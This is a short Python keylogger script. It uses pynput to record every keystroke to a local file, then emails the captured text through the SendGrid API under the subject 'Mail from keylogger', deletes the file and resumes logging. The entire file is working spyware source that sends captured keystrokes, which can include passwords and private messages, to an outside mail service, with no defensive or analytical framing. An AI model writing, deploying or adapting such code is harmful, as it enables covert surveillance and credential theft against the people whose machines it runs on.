from pynput.keyboard import Key,Listener
import logging
import os
import time
import sendgrid
import base64
import os
from sendgrid import SendGridAPIClient,Attachment
from sendgrid.helpers.mail import Mail

from dotenv import load_dotenv
load_dotenv()

def send_mail():
    li = []
    to_mail = ['']
    from_mail = ''
    SENDGRID_API_KEY=os.getenv('SEND_GRID')
    #Add your own sendgrid API key
    pdf = open('key_log.txt', "r").read()
    with open('key_log.txt','r') as f:
        for x in f:
            if len(x)==4:
                li.append(x[1:2])
            else:
                li.append('\n'+x)
        f.close()

    main = '\n'.join(li)
    message = Mail(
        from_email=from_mail,
        to_emails=to_mail,
        subject='Mail from keylogger',
        html_content=main)

    try:
        sg = SendGridAPIClient(SENDGRID_API_KEY)
        response = sg.send(message)
    except Exception as e:
        print('')

send_mail()
os.remove('key_log.txt')
time.sleep(5)
logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()





